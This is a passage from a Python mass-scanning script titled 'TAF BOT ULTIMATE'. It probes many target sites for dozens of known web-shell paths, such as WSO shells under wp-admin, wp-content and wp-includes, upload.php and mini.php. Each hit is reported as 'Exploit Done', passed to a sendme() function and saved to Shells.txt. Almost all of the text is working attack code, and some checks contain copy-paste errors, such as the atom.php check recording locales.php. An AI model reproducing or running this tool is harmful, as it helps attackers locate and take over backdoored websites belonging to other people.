                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/classic/inc/index.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/themes/classic/inc/index.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#63 /403.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/403.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/403.php#")
            open("Shells.txt", "a").write(url + "/403.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/403.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/403.php#")
                open("Shells.txt", "a").write(url + "/403.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
      
#64/wp-content/406.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/406.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/406.php#")
            open("Shells.txt", "a").write(url + "/wp-content/406.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/406.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/406.php")
                open("Shells.txt", "a").write(url + "/wp-content/406.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#65 /wp-admin/406.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/406.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/406.php#")
            open("Shells.txt", "a").write(url + "/wp-admin/406.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/406.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/406.php#")
                open("Shells.txt", "a").write(url + "/wp-admin/406.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#66 /wp-content/plugins/core-stab/index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/core-stab/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/plugins/core-stab/index.php")
            open("Shells.txt", "a").write(
                url + "/wp-content/plugins/core-stab/index.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/core-stab/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/plugins/core-stab/index.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/plugins/core-stab/index.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#67 /wp-admin/wso112233.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/wso112233.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/wso112233.php#")
            open("Shells.txt", "a").write(url + "/wp-admin/wso112233.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/wso112233.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/wso112233.php#")
                open("Shells.txt", "a").write(url + "/wp-admin/wso112233.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#68 /wp-content/wso112233.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/wso112233.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/wso112233.php#")
            open("Shells.txt", "a").write(url + "/wp-content/wso112233.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/wso112233.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/wso112233.php#")
                open("Shells.txt", "a").write(url + "/wp-content/wso112233.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))    

#69 /wp-includes/wso112233.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/wso112233.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/wso112233.php#")
            open("Shells.txt", "a").write(url + "/wp-includes/wso112233.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/wso112233.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/wso112233.php#")
                open("Shells.txt", "a").write(url + "/wp-includes/wso112233.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))  

#70 /xl2023.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/xl2023.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/xl2023.php")
            open("Shells.txt", "a").write(url + "/xl2023.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/xl2023.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/xl2023.php")
                open("Shells.txt", "a").write(url + "/xl2023.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))   

#71 /wp-includes/xl2023.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/xl2023.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/xl2023.php")
            open("Shells.txt", "a").write(url + "/wp-includes/xl2023.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/xl2023.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/xl2023.php")
                open("Shells.txt", "a").write(url + "/wp-includes/xl2023.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#72 /wp-content/xl2023.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/xl2023.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/xl2023.php")
            open("Shells.txt", "a").write(url + "/wp-content/xl2023.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/xl2023.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/xl2023.php")
                open("Shells.txt", "a").write(url + "/wp-content/xl2023.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))  

#73 /wp-admin/xl2023.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/xl2023.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/xl2023.php")
            open("Shells.txt", "a").write(url + "/wp-admin/xl2023.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/xl2023.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/xl2023.php")
                open("Shells.txt", "a").write(url + "/wp-admin/xl2023.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#74 /wsoyanzorng.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wsoyanzorng.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wsoyanzorng.php")
            open("Shells.txt", "a").write(url + "/wsoyanzorng.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wsoyanzorng.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wsoyanzorng.php")
                open("Shells.txt", "a").write(url + "/wsoyanzorng.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#75 /wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647", headers=headers, allow_redirects=True, timeout=15
        )
        if "<input type='submit' value='UPload File' />" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
            open("Shells.txt", "a").write(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "<input type='submit' value='UPload File' />" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
                open("Shells.txt", "a").write(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#76 /wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647", headers=headers, allow_redirects=True, timeout=15
        )
        if '<span>Upload file:' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
            open("Shells.txt", "a").write(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if '<span>Upload file:' in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
                open("Shells.txt", "a").write(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#77 /wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647", headers=headers, allow_redirects=True, timeout=15
        )
        if 'type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
            open("Shells.txt", "a").write(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if 'type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
                open("Shells.txt", "a").write(url + "/wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#78 /webadmin/about.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/webadmin/about.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/webadmin/about.php")
            open("Shells.txt", "a").write(url + "/webadmin/about.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/webadmin/about.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/webadmin/about.php")
                open("Shells.txt", "a").write(url + "/webadmin/about.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#79 /wp-content/themes/mero-magazine/ws.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/mero-magazine/ws.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/mero-magazine/ws.php")
            open("Shells.txt", "a").write(url + "/wp-content/themes/mero-magazine/ws.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/mero-magazine/ws.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/mero-magazine/ws.php")
                open("Shells.txt", "a").write(url + "/wp-content/themes/mero-magazine/ws.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))  

#80 /wp-admin/images.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/images.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/images.php")
            open("Shells.txt", "a").write(url + "/wp-admin/images.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/images.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/images.php")
                open("Shells.txt", "a").write(url + "/wp-admin/images.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))  

#81 /wp-content/plugins/sid/sidwso.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/sid/sidwso.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/plugins/sid/sidwso.php")
            open("Shells.txt", "a").write(url + "/wp-content/plugins/sid/sidwso.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/plugins/sid/sidwso.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/plugins/sid/sidwso.php")
                open("Shells.txt", "a").write(url + "/wp-content/plugins/sid/sidwso.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))                 

#82 /locales.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/locales.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/locales.php")
            open("Shells.txt", "a").write(url + "/locales.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/locales.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/locales.php")
                open("Shells.txt", "a").write(url + "/locales.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))       

#83 /wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php")
            open("Shells.txt", "a").write(url + "/wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php")
                open("Shells.txt", "a").write(url + "/wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))   

#84 /wp-includes/atom.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/atom.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/locales.php")
            open("Shells.txt", "a").write(url + "/locales.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/locales.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/locales.php")
                open("Shells.txt", "a").write(url + "/locales.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#85 /about.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/about.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/about.php")
            open("Shells.txt", "a").write(url + "/about.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/about.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/about.php")
                open("Shells.txt", "a").write(url + "/about.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#86 /upload.php?mr=exe3
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/upload.php?mr=exe3", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/upload.php?mr=exe3")
            open("Shells.txt", "a").write(url + "/upload.php?mr=exe3")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/upload.php?mr=exe3",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/upload.php?mr=exe3")
                open("Shells.txt", "a").write(url + "/upload.php?mr=exe3")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#87 /mini.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/mini.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/mini.php")
            open("Shells.txt", "a").write(url + "/mini.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/mini.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/mini.php")
                open("Shells.txt", "a").write(url + "/mini.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))    

#88 /up.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/up.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/up.php")
            open("Shells.txt", "a").write(url + "/up.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/up.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/up.php")
                open("Shells.txt", "a").write(url + "/up.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))                                                                                 
 
#89 /wp-22.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-22.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-22.php")
            open("Shells.txt", "a").write(url + "/wp-22.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-22.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-22.php")
                open("Shells.txt", "a").write(url + "/wp-22.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#90 /wp.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp.php")
            open("Shells.txt", "a").write(url + "/wp.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp.php")
                open("Shells.txt", "a").write(url + "/wp.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))    

#91 /lock360.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/lock360.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/lock360.php")
            open("Shells.txt", "a").write(url + "/lock360.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/lock360.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/lock360.php")
                open("Shells.txt", "a").write(url + "/lock360.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))      

#92 /1.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/1.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/1.php")
            open("Shells.txt", "a").write(url + "/1.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/1.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/1.php")
                open("Shells.txt", "a").write(url + "/1.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))      
    except:
        print("\\033[0;31mDEAD-->" + url + " --> {}[No Response]".format(fr))

#

mp = Pool(poolAmount)
mp.map(FourHundredThree, target)
mp.close()
mp.join()
print(" [!] {}TAF BOT ULTIMATE Finished Checking".format(fc))